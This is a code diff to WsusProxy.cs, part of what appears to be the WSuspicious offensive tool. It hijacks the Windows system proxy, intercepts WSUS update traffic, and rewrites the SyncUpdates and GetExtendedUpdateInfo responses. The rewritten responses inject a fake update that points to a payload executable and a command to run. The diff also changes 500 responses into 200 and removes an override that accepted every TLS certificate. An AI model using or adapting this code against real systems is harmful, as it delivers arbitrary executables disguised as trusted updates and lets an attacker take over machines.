@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
+using System.Linq;
 using System.Net;
 using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Xml;
+using System.Xml.Linq;
 using Titanium.Web.Proxy;
 using Titanium.Web.Proxy.EventArguments;
 using Titanium.Web.Proxy.Exceptions;
@@ -12,7 +14,7 @@ using Titanium.Web.Proxy.Models;
 
 namespace WSuspicious.Proxy
 {
-    class WsusProxy
+    class WsusProxy : IDisposable
     {
         private readonly SemaphoreSlim @lock = new SemaphoreSlim(1);
         private readonly ProxyServer proxyServer;
@@ -96,20 +98,17 @@ namespace WSuspicious.Proxy
             proxyManager = new InternetExplorerProxyManager();
         }
 
-        public void Start()
+        public void Start(int listenPort)
         {
             proxyServer.BeforeRequest += onRequest;
             proxyServer.BeforeResponse += onResponse;
 
             //proxyServer.EnableWinAuth = true;
 
-            explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Loopback, 13337);
+            explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Loopback, listenPort);
 
             // Fired when a CONNECT request is received
             explicitEndPoint.BeforeTunnelConnectRequest += onBeforeTunnelConnectRequest;
-
-            // Fired upon cert validation
-            proxyServer.ServerCertificateValidationCallback += OnCertificateValidation;
 
             // An explicit endpoint is where the client knows about the existence of a proxy
             // So client sends request in a proxy friendly manner
@@ -123,43 +122,26 @@ namespace WSuspicious.Proxy
             }
 
             // Set us as the new proxy
-            if (this.isHTTPS)
-            {
-                proxyManager.setProxy(ProxyTypes.HTTPS, "127.0.0.1", 13337);
-            }
-            else
-            {
-                proxyManager.setProxy(ProxyTypes.HTTP, "127.0.0.1", 13337);
-            }
+            proxyManager.setProxy("127.0.0.1", listenPort);
         }
 
         public void Stop()
         {
             explicitEndPoint.BeforeTunnelConnectRequest -= onBeforeTunnelConnectRequest;
-            proxyServer.ServerCertificateValidationCallback -= OnCertificateValidation;
 
             proxyServer.BeforeRequest -= onRequest;
             proxyServer.BeforeResponse -= onResponse;
 
             proxyServer.Stop();
-            
-            proxyServer.RestoreOriginalProxySettings();
+
+            proxyManager.revert();
         }
 
-        //private async Task<IExternalProxy> onGetCustomUpStreamProxyFunc(SessionEventArgsBase arg)
-        //{
-        //    // this is just to show the functionality, provided values are junk
-        //    return new ExternalProxy
-        //    {
-        //        BypassLocalhost = false,
-        //        HostName = "127.0.0.9",
-        //        Port = 9090,
-        //        Password = "fake",
-        //        UserName = "fake",
-        //        UseDefaultCredentials = false
-        //    };
-        //}
-        
+        public void Dispose()
+        {
+            Stop();
+        }
+
         private async Task onBeforeTunnelConnectRequest(object sender, TunnelConnectSessionEventArgs e)
         {
             string hostname = e.HttpClient.Request.RequestUri.Host;
@@ -171,10 +153,7 @@ namespace WSuspicious.Proxy
                 e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
             }
 
-            if (wsusHost != null && !hostname.Contains(wsusHost))
-            {
-                e.DecryptSsl = false;
-            }
+            e.DecryptSsl = false;
         }
 
         // intercept & cancel redirect or update requests
@@ -224,108 +203,87 @@ namespace WSuspicious.Proxy
             string hostname = e.HttpClient.Request.RequestUri.Host;
             if (hostname.Contains(wsusHost))
             {
-                string body = await e.GetResponseBodyAsString();
+                byte[] bodyBytes = await e.GetResponseBody();
 
-                if (flagStep == 1 && body.Contains("<SyncUpdatesResult>"))
+                if (bodyBytes.Length > 0)
                 {
-                    if (e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
+                    if (flagStep == 1)
                     {
-                        string newUpdatesTemplate = WSuspicious.Properties.Resources.NewUpdatesTemplate;
-                        newUpdatesTemplate = String.Format(newUpdatesTemplate, updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);
-
-                        XmlDocument newUpdatesNode = new XmlDocument();
-                        newUpdatesNode.LoadXml(newUpdatesTemplate);
-
-                        XmlDocument doc = new XmlDocument();
-                        doc.LoadXml(body);
-
-                        // If there are real Update or OutOfScopeRevisionIDs tags, delete the node
-                        XmlNodeList updateNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "NewUpdates"));
-                        foreach (XmlNode deletedNode in updateNodes)
+                        using (Stream stream = new MemoryStream(bodyBytes))
                         {
-                            deletedNode.ParentNode.RemoveChild(deletedNode);
+                            XDocument doc = XDocument.Load(stream);
+
+                            var syncUpdatesResult = from p in doc.Descendants()
+                                                where p.Name.LocalName == "SyncUpdatesResult"
+                                                select p;
+
+                            if (syncUpdatesResult.Count() > 0 && e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
+                            {
+                                var ns = syncUpdatesResult.First().GetDefaultNamespace();
+
+                                string newUpdatesTemplate = ResourceHandler.NewUpdatesTemplate.Trim();
+                                newUpdatesTemplate = String.Format(newUpdatesTemplate, updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);
+
+                                // If there are real Update or OutOfScopeRevisionIDs tags, delete the node
+                                doc.Descendants(ns + "NewUpdates").Remove();
+                                doc.Descendants(ns + "ChangedUpdates").Remove();
+                                doc.Descendants(ns + "OutOfScopeRevisionIDs").Remove();
+
+                                XElement importedNewUpdatesNode = XElement.Parse(newUpdatesTemplate);
+                                doc.Descendants(ns + "SyncUpdatesResult").FirstOrDefault().AddFirst(importedNewUpdatesNode);
+
+                                // Small hack to handle the namespace during the XML merges above
+                                string returnedBody = doc.ToString(SaveOptions.DisableFormatting).Replace("<NewUpdates xmlns=\"\">", "<NewUpdates>");
+                                
+                                e.SetResponseBodyString(returnedBody);
+
+                                await writeToConsole("---- First stage on the way ----");
+                            }
                         }
 
-                        XmlNodeList changedUpdateNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "ChangedUpdates"));
-                        foreach (XmlNode deletedNode in changedUpdateNodes)
-                        {
-                            deletedNode.ParentNode.RemoveChild(deletedNode);
-                        }
-
-                        XmlNodeList outOfScopeRevisionNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "OutOfScopeRevisionIDs"));
-                        foreach (XmlNode deletedNode in outOfScopeRevisionNodes)
-                        {
-                            deletedNode.ParentNode.RemoveChild(deletedNode);
-                        }
-
-                        XmlNode syncNode = doc.SelectSingleNode(String.Format("//*[local-name()='{0}']", "SyncUpdatesResult"));
-
-                        XmlNode importedNewUpdatesNode = syncNode.OwnerDocument.ImportNode(newUpdatesNode.FirstChild, true);
-                        syncNode.PrependChild(importedNewUpdatesNode);
-
-                        // Small hack to handle the namespace during the XML merges above
-                        string returnedBody = doc.OuterXml.Replace("<NewUpdates xmlns=\"\">", "<NewUpdates>");
-
-                        e.SetResponseBodyString(returnedBody);
-
-                        await writeToConsole("---- First stage on the way ----");
+                        flagStep = 0;
                     }
-
-                    flagStep = 0;
-                }
-                else if (flagStep == 2)
-                {
-                    List<HttpHeader> soapActionHeaders = e.HttpClient.Request.Headers.GetHeaders("SOAPAction");
-
-                    if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
+                    else if (flagStep == 2)
                     {
-                        string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
-                        string secondPhaseTemplate = WSuspicious.Properties.Resources.ExtendedUpdateInfoTemplate;
-                        secondPhaseTemplate = String.Format(secondPhaseTemplate,
-                            updateID2,
-                            payload.Length,
-                            payload.Length,
-                            WebUtility.HtmlEncode(payloadSHA1),
-                            WebUtility.HtmlEncode(payloadExecutableName),
-                            payload.Length,
-                            WebUtility.HtmlEncode(payloadSHA256),
-                            executedCommand,
-                            WebUtility.HtmlEncode(payloadExecutableName),
-                            updateID1,
-                            updateID1,
-                            updateID2,
-                            payloadSHA1,
-                            payloadURL
-                        );
+                        List<HttpHeader> soapActionHeaders = e.HttpClient.Request.Headers.GetHeaders("SOAPAction");
 
-                        // TODO: I do not know if that works
-                        if (e.HttpClient.Response.StatusCode == 500)
+                        if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                         {
-                            e.HttpClient.Response.StatusCode = 200;
-                            e.HttpClient.Response.StatusDescription = "OK";
+                            string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
+                            string secondPhaseTemplate = ResourceHandler.ExtendedUpdateInfoTemplate;
+                            secondPhaseTemplate = String.Format(secondPhaseTemplate,
+                                updateID2,
+                                payload.Length,
+                                payload.Length,
+                                WebUtility.HtmlEncode(payloadSHA1),
+                                WebUtility.HtmlEncode(payloadExecutableName),
+                                payload.Length,
+                                WebUtility.HtmlEncode(payloadSHA256),
+                                executedCommand,
+                                WebUtility.HtmlEncode(payloadExecutableName),
+                                updateID1,
+                                updateID1,
+                                updateID2,
+                                payloadSHA1,
+                                payloadURL
+                            );
+
+                            // TODO: I do not know if that works
+                            if (e.HttpClient.Response.StatusCode == 500)
+                            {
+                                e.HttpClient.Response.StatusCode = 200;
+                                e.HttpClient.Response.StatusDescription = "OK";
+                            }
+
+                            e.SetResponseBodyString(secondPhaseTemplate);
+
+                            await writeToConsole("---- Second stage on the way ----");
                         }
 
-                        e.SetResponseBodyString(secondPhaseTemplate);
-
-                        await writeToConsole("---- Second stage on the way ----");
+                        flagStep = 0;
                     }
-
-                    flagStep = 0;
                 }
             }
-        }
-
-        /// <summary>
-        ///     Allows overriding default certificate validation logic
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        public Task OnCertificateValidation(object sender, CertificateValidationEventArgs e)
-        {
-            e.IsValid = true;
-
-            // To make this 4.5 compatible, we have to use this instead of return Task.CompletedTask;
-            return Task.FromResult(0);
         }
 
         private async Task writeDebugToConsole(string message, ConsoleColor? consoleColor = null)
